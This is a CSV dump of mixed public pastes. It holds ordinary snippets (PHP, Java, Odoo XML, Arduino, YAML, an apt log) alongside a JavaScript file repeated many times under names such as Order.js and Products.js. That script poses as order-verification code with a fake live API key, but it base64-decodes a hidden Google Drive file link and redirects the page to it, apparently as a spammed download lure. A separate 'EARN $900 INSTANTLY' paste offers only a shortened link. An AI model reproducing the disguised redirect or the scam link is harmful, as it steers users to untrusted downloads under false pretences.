id,title,username,language,date,content
Y41EuSPn,Untitled,hubertzoo90,JavaScript,Monday 14th of April 2025 07:07:27 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/46563/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
Xu4x88By,wcfm_shortcode_get_vendor_list_by_spmv_product_id,palsushobhan,PHP,Monday 14th of April 2025 06:57:29 AM CDT,"/* List of vendors selling a particular product (SPMV), sorted by product price ASC*/
add_shortcode('wcfm_vendors_card_by_product', function($attr) {
    global $wpdb, $WCFMmp;
    if ( empty( $attr['id'] ) || ! absint( $attr['id'] ) ) return '';
    $product_id = absint( $attr['id'] );
    $product = wc_get_product($product_id);
    if(!$product) return '';
    $vendor_id = wcfm_get_vendor_id_by_post($product_id);
    if(!apply_filters( 'wcfm_is_allow_product_multivendor_title_edit_disable', true )) return $vendor_id;
    $multi_parent_id = get_post_meta( $product_id, '_is_multi_parent', true );
    if(!$multi_parent_id) {
        $multi_parent_id = get_post_meta( $product_id, '_has_multi_selling', true );
    }
    if(!$multi_parent_id) return $vendor_id;
    $sql = ""SELECT GROUP_CONCAT(product_id) as products FROM `{$wpdb->prefix}wcfm_marketplace_product_multivendor` WHERE `parent_product_id` = $multi_parent_id"";
    $results = $wpdb->get_row( $sql );
    $product_list = isset($results->products) ? explode(',', $results->products) : array();
    if(!in_array($multi_parent_id, $product_list)) {
        array_unshift($product_list, $multi_parent_id);
    }
    $product_ids = implode(',', $product_list);
    $sql = ""SELECT product_id, stock_status, stock_quantity FROM {$wpdb->wc_product_meta_lookup} wc_product_meta_lookup WHERE product_id IN (%1s) ORDER BY wc_product_meta_lookup.min_price ASC"";
    $prepare = $wpdb->prepare($sql, $product_ids);
    $product_metas = $wpdb->get_results($prepare);
    $vendor_list = [];
    if( !empty( $product_metas ) ) {
        foreach( $product_metas  as $pmkey => $product_meta ) {
            if( $product_meta->stock_status == 'outofstock' ) continue;
            $post_status = get_post_status( $product_meta->product_id );
            if( $post_status != 'publish' ) continue;
            $vendor_id = wcfm_get_vendor_id_by_post( $product_meta->product_id );
            if( $vendor_id && !in_array( $vendor_id, $vendor_list ) ) {
                $vendor_list[] = $vendor_id;
            }            
        }
    }
    if( empty( $vendor_list ) ) return '';
    ob_start();
    ?>
    <div id=""wcfmmp-stores-wrap"" class=""top-vendor-container"">
        <div class=""wcfmmp-stores-content"">
            <ul class=""top-vendor-list wcfmmp-store-wrap"">
                <?php
                $args = array('per_row' => 3);
                foreach ( $vendor_list as $vendor_id ) {	
                    $args['store_id'] = $vendor_id;
                    $WCFMmp->template->get_template( 'store-lists/wcfmmp-view-store-lists-card.php', $args );
                }
                ?>
            </ul>
        </div>
    </div>
    <?php
    $list = ob_get_contents();
    ob_end_clean();
    return $list;
});"
NzGBj4AT,Products.js,hubertzoo90,JavaScript,Monday 14th of April 2025 06:51:42 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/83205/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
CRjJabA2,[NP] F1 Race,dzocesrce,Java,Monday 14th of April 2025 06:40:33 AM CDT,"import java.io.*;
import java.util.List;
import java.util.stream.Collectors;
import java.time.Duration;
import java.time.LocalTime;
import java.util.ArrayList;
import java.util.Comparator;
import java.util.List;

class Driver implements Comparable<Driver> {
    public static int finalPos=0;

    private String name;
    private List<Lap> laps;

    public Driver(String name,List<Lap> laps) {
        this.name = name;
        this.laps = laps;
    }

    private Lap getFastestLap(){
        return laps.stream().min(Comparator.naturalOrder()).get();
    }
    public static Driver createDriver(String s) {
        String[] parts = s.split(""\\s+"");
        String name = parts[0];
        List<Lap> laps = new ArrayList<>();
        laps.add(new Lap(parts[1]));
        laps.add(new Lap(parts[2]));
        laps.add(new Lap(parts[3]));
        return new Driver(name,laps);
    }

    @Override
    public int compareTo(Driver o) {
        return (int)Long.compare(getFastestLap().getLocalTimeVersion().toNanoOfDay()
                ,o.getFastestLap().getLocalTimeVersion().toNanoOfDay());
    }

    @Override
    public String toString() {
        return String.format(""%d. %-10s%10s"",++finalPos,name,getFastestLap().getTime());
    }
}

class Lap implements Comparable<Lap>{
    private String time;

    public Lap(String time) {
        this.time = time;
    }

    public String getTime() {
        return time;
    }

    public LocalTime getLocalTimeVersion(){
        String[] parts= time.split("":"");
        int minutes= Integer.parseInt(parts[0]);
        int seconds= Integer.parseInt(parts[1]);
        int nanos= Integer.parseInt(parts[2]);
        return LocalTime.of(0,minutes,seconds,nanos);
    }

    @Override
    public int compareTo(Lap o) {
        return (int)Long.compare(getLocalTimeVersion().toNanoOfDay(),o.getLocalTimeVersion().toNanoOfDay());
    }

    @Override
    public String toString() {
        return time+"" ""+getLocalTimeVersion();
    }
}

class F1Race {

    private List<Driver> drivers;

    public F1Race() {
        this.drivers = drivers;
    }

    public void readResults(InputStream in) {
        BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(in));
        this.drivers= bufferedReader.lines().map(i->Driver.createDriver(i)).collect(Collectors.toList());
    }

    public void printSorted(PrintStream out) {
        PrintWriter printWriter= new PrintWriter(out);

        this.drivers.stream().sorted().forEach(i->printWriter.println(i));
        printWriter.flush();
    }
}

public class F1Test {

    public static void main(String[] args) {
        F1Race f1Race = new F1Race();
        f1Race.readResults(System.in);
        f1Race.printSorted(System.out);

    }

}
"
dkppcMpU,Order.js,hubertzoo90,JavaScript,Monday 14th of April 2025 06:36:20 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/51513/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
QgyLBfhU,[QW][4707829]special_footer_external_layout_boxed,rht_odoo,XML,Monday 14th of April 2025 06:25:25 AM CDT,"<data>
    <!--
    Done by RHT on the 14/04/2025
    Need : different footer for commerical invoice
    Task : https://www.odoo.com/odoo/project.task/4707829
    Pastebin : https://pastebin.com/QgyLBfhU
    -->
    <xpath expr=""//div[contains(@class, 'footer')]"" position=""replace"">
        <div t-attf-class=""footer o_company_#{company.id}_layout {{report_type != 'pdf' and 'mt-auto'}}"" t-if=""commercial_footer"">
            <div class=""o_footer_content row border-top pt-2"">
                <div class=""col-8"">
                    I certify that the information presented on this invoice is true and accurate to the best of my knowledge.
                </div>
                <div class=""row"">
                    <div class=""col-5"">
                        <strong>Authorized By:</strong>   __________________________
                    </div>
                    <div class=""col-4"">
                        <strong>Title:</strong>   __________________________
                    </div>
                    <div class=""col-3"">
                        <strong>Date:</strong>   _________________
                    </div>
                    
                </div>
            </div>
        </div>
        <div t-attf-class=""footer o_company_#{company.id}_layout {{report_type != 'pdf' and 'mt-auto'}}"" t-if=""not commercial_footer"">
            <div class=""o_footer_content row border-top pt-2"">
                <div class=""col-8"">
                    <span t-field=""company.report_footer""/>
                </div>
                <div class=""col-4 text-end"">
                    <strong t-if=""company.report_header"" t-field=""company.report_header"" class=""o_company_tagline"">Company tagline</strong>
                    <span t-if=""report_type == 'pdf' and display_name_in_footer"" class=""text-muted"" t-out=""str(o.name) + ', '"">(document name)</span>
                    <span t-if=""report_type == 'pdf'"" class=""text-muted"">Page <span class=""page""/> / <span class=""topage""/></span>
                </div>
            </div>
        </div>
    </xpath>
    
</data>"
xQEgQzGy,[QW][4707829]commercial_footer_invoice_document,rht_odoo,XML,Monday 14th of April 2025 06:21:40 AM CDT,"<data>
    <!--
    Done by RHT on the 14/04/2025
    Need : different footer for commerical invoice
    Task : https://www.odoo.com/odoo/project.task/4707829
    Pastebin : https://pastebin.com/xQEgQzGy
    -->
    <xpath expr=""//t[2]"" position=""after"">
        <t t-set=""commercial_footer"" t-value=""true""/>
    </xpath>
</data>"
mAJLF5tp,Market.js,hubertzoo90,JavaScript,Monday 14th of April 2025 06:20:57 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/63729/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
JC3fDmqN,EARN $900 INSTANTLY 2025 2U,bhentzz,JavaScript,Monday 14th of April 2025 06:14:14 AM CDT," 
Pdf https://tinyurl.com/privguidee


52w89U6IbX
"
jkGUCrX0,**Medication Reminder** rev_01,pleasedontcode,Arduino,Monday 14th of April 2025 06:05:44 AM CDT,"/********* Pleasedontcode.com **********

	Pleasedontcode thanks you for automatic code generation! Enjoy your code!

	- Terms and Conditions:
	You have a non-exclusive, revocable, worldwide, royalty-free license
	for personal and commercial use. Attribution is optional; modifications
	are allowed, but you're responsible for code maintenance. We're not
	liable for any loss or damage. For full terms,
	please visit pleasedontcode.com/termsandconditions.

	- Project: **Medication Reminder**
	- Source Code NOT compiled for: ESP8266 NodeMCU V1.0
	- Source Code created on: 2025-04-14 11:04:03

********* Pleasedontcode.com **********/

/****** SYSTEM REQUIREMENTS *****/
/****** SYSTEM REQUIREMENT 1 *****/
	/* Display reminder for pill at 4:40 pm ist via rtc */
/****** END SYSTEM REQUIREMENTS *****/

/* START CODE */

/****** DEFINITION OF LIBRARIES *****/
#include <EasyButton.h>	//https://github.com/evert-arias/EasyButton
#include <Wire.h>
#include <RTClib.h>
#include <LiquidCrystal_I2C.h>

// Initialize RTC and LCD
RTC_DS3231 rtc;
LiquidCrystal_I2C lcd(0x27, 16, 2); // I2C address may be 0x3F on some LCDs

// Medicine info
String medicines[4] = {""Paracetamol"", ""Vitamin C"", ""Antibiotic"", ""Painkiller""};
int reminderHours[4] = {16}; // Reminder set for 4 PM (16:00 in 24hr format)
int reminderMinutes[4] = {40}; // Reminder set for 40 minutes past the hour

// Other components
const int ledPin = 14;   // D5 on NodeMCU (Change pin if needed)
const int buzzerPin = 0; // D3 on NodeMCU
const int buttonPin = 2; // D4 on NodeMCU

// Flag to track reminders
bool alertTriggered[4] = {false, false, false, false};
unsigned long lastDisplayUpdate = 0;

/****** FUNCTION PROTOTYPES *****/
void setup(void);
void loop(void);

/***** DEFINITION OF DIGITAL INPUT PINS *****/
const uint8_t Button_PushButton_PIN_D1		= 1; // This pin is not used in the USER CODE

/****** DEFINITION OF LIBRARIES CLASS INSTANCES*****/

void setup(void)
{
	// put your setup code here, to run once:
	Serial.begin(9600);
	Wire.begin();
	rtc.begin();
	lcd.begin(16, 2);  // Corrected begin with cols and rows
	lcd.backlight();

	// Setup output pins
	pinMode(ledPin, OUTPUT);
	digitalWrite(ledPin, LOW);

	pinMode(buzzerPin, OUTPUT);
	pinMode(buttonPin, INPUT_PULLUP);

	lcd.setCursor(0, 0);
	lcd.print(""  Pill Time Boot "");
	delay(2000);
	lcd.clear();

	pinMode(Button_PushButton_PIN_D1, INPUT_PULLUP); // Keep this for compatibility with EasyButton
}

void loop(void)
{
	DateTime now = rtc.now();

	// Update time display every second
	if (millis() - lastDisplayUpdate >= 1000) {
		showTime(now);
		lastDisplayUpdate = millis();
	}

	// Check reminders
	for (int i = 0; i < 4; i++) {
		if (now.hour() == reminderHours[i] && now.minute() == reminderMinutes[i] && !alertTriggered[i]) {
			triggerReminder(i);
			alertTriggered[i] = true;
		}

		// Reset trigger for next day
		if (now.hour() != reminderHours[i] || now.minute() != reminderMinutes[i]) {
			alertTriggered[i] = false;
		}
	}

	delay(100);
}

void showTime(DateTime now) {
	char timeBuffer[9];
	sprintf(timeBuffer, ""%02d:%02d:%02d"", now.hour(), now.minute(), now.second());

	lcd.setCursor(0, 0);
	lcd.print(""Time: "");
	lcd.print(timeBuffer);
	lcd.print(""  ""); // Padding
}

void triggerReminder(int index) {
	lcd.clear();
	lcd.setCursor(0, 0);
	lcd.print(""Take: "");
	lcd.print(medicines[index].substring(0, 10)); // Fit name in LCD
	digitalWrite(ledPin, HIGH);  // Turn on LED
	tone(buzzerPin, 1000);

	// Wait for pushbutton acknowledgment
	while (digitalRead(buttonPin) == HIGH) {
		delay(100);
	}

	// Acknowledged
	noTone(buzzerPin);
	digitalWrite(ledPin, LOW);  // Turn off LED

	lcd.clear();
	lcd.setCursor(0, 0);
	lcd.print(medicines[index]);
	lcd.setCursor(0, 1);
	lcd.print(""Taken ✔"");
	delay(2000);
	lcd.clear();
}

/* END CODE */"
DF232KSR,Untitled,hubertzoo90,JavaScript,Monday 14th of April 2025 06:05:28 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/66544/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
Rq6RbWGP,dataNone,TestGuy1,JSON,Monday 14th of April 2025 06:00:05 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: '5407e716cdcf33d6737da61968a94f8d1351db3fa3181287beeb2169493867d6b1d5df3da7c969abf1838f46e2808b3457ef6868ed4f5f0a69725d715c2061b0c2d839bbc61e4e57484bf1269a4efe55c8a31c066017cddb6602e6f6ef9fbaa6a71c4c8547b60d544ddf6fe4e9c2e7ea7bfc7b7af5efab67fe150c397620d10d',
  otherdata: [
    'e2a5f9cddca1b7bebe0ebf2f39d2049e',
    '56e250da0aea0841897f1292cb2048f8',
    'aaa194ea8a8107c90b2b4f4d3ab93c89',
    'b80c348d34277d9ab45e5501d768430e',
    '12c5da39d9545b24cba885258ec5a351',
    'f28c63f866dd28cdbf0fff7bb6fa0155',
    '0c1233210feed2a00c105ab9c3fc0613',
    '724c674f0af12b1350830d7d7e78498d'
  ]
}"
B63XY2sZ,Products.js,jm33,JavaScript,Monday 14th of April 2025 05:50:01 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/15589/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
kBBgvMeh,Order.js,jm33,JavaScript,Monday 14th of April 2025 05:34:39 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/41582/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
5Ei66xG7,Market.js,jm33,JavaScript,Monday 14th of April 2025 05:18:54 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/54031/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
dSekhamM,Vacuum animation,fablav,YAML,Monday 14th of April 2025 05:16:56 AM CDT,"

Idk how to make code blocks pretty on Facebook, if that’s possible.

Vacuum Keyframes and YAML for card mod:

card_mod:
      style: |
        ha-icon {
          {% if is_state('vacuum.mr_grimes','cleaning') %}
            --card-mod-icon: mdi:robot-vacuum;
            animation: vacuum 12s ease infinite;
          {% else %}
            --card-mod-icon: mdi:robot-vacuum-off;
          {% endif %}
        }
        .switch-button {
            {% if is_state('vacuum.mr_grimes','cleaning') %}
              background-image: linear-gradient(transparent, rgba(0,255,2,0.2));
            {% else %}
            {% endif %}
        }  
        @keyframes vacuum {
          0%, 5% { transform: translate(0px,0px) rotate(0deg); }
          10% { transform: translate(0px,0px) rotate(90deg); }
          15%, 20% { transform: translate(5px,0px) rotate(90deg); }  
          25% { transform: translate(5px,0px) rotate(0deg); }
          30%, 35% { transform: translate(5px,-5px) rotate(0deg); }
          40% { transform: translate(5px,-5px) rotate(-90deg); }
          45%, 50% { transform: translate(-5px,-5px) rotate(-90deg); }
          55% { transform: translate(-5px,-5px) rotate(-180deg); }
          60%, 65% { transform: translate(-5px,5px) rotate(-180deg); }
          70% { transform: translate(-5px,5px) rotate(-270deg); }
          75%, 80% { transform: translate(0px,5px) rotate(-270deg); }
          85% { transform: translate(0px,5px) rotate(-360deg); }
          90%, 100% {transform: translate(0px,0px) rotate(-360deg); }
        }"
NQhS5GQU,Untitled,jm33,JavaScript,Monday 14th of April 2025 05:03:32 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/32281/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
W1nwK1eB,Untitled,Hertell,Bash,Monday 14th of April 2025 05:01:35 AM CDT,"Error: Execution of '/usr/bin/apt-get -q -y -o DPkg::Options::=--force-confold install libxmlsec1-dev' returned 100: Reading package lists...
Building dependency tree...
Reading state information...
The following additional packages will be installed:
  libgcrypt20-dev libgmp-dev libgmpxx4ldbl libgnutls-dane0 libgnutls-openssl27
  libgnutls28-dev libgnutlsxx28 libgpg-error-dev libidn2-dev libnspr4-dev
  libnss3-dev libp11-kit-dev libtasn1-6-dev libunbound8 libxmlsec1-gcrypt
  libxmlsec1-gnutls libxmlsec1-openssl libxslt1-dev nettle-dev
Suggested packages:
  libgcrypt20-doc gmp-doc libgmp10-doc libmpfr-dev dns-root-data gnutls-bin
  gnutls-doc
Recommended packages:
  libtasn1-doc
The following NEW packages will be installed:
  libgcrypt20-dev libgmp-dev libgmpxx4ldbl libgnutls-dane0 libgnutls-openssl27
  libgnutls28-dev libgnutlsxx28 libgpg-error-dev libidn2-dev libnspr4-dev
  libnss3-dev libp11-kit-dev libtasn1-6-dev libunbound8 libxmlsec1-dev
  libxmlsec1-gcrypt libxmlsec1-gnutls libxmlsec1-openssl libxslt1-dev
  nettle-dev
0 upgraded, 20 newly installed, 0 to remove and 0 not upgraded.
Need to get 508 kB/7433 kB of archives.
After this operation, 24.9 MB of additional disk space will be used.
Ign:1 http://security.debian.org/debian-security bullseye-security/main amd64 libunbound8 amd64 1.13.1-1+deb11u3
Err:1 http://mirror.hetzner.com/debian/security bullseye-security/main amd64 libunbound8 amd64 1.13.1-1+deb11u3
  404  Not Found [IP: 2a04:4e42:3a::644 80]
E: Failed to fetch http://mirror.hetzner.com/debian/security/pool/updates/main/u/unbound/libunbound8_1.13.1-1%2bdeb11u3_amd64.deb  404  Not Found [IP: 2a04:4e42:3a::644 80]
E: Unable to fetch some archives, maybe run apt-get update or try with --fix-missing?"
fmyAnQg9,Products.js,jm33,JavaScript,Monday 14th of April 2025 04:48:09 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/24340/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
hE1uAsN4,Order.js,jm33,JavaScript,Monday 14th of April 2025 04:32:45 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/87634/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
6t7Ryq0B,Market.js,jm33,JavaScript,Monday 14th of April 2025 04:17:21 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/66341/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

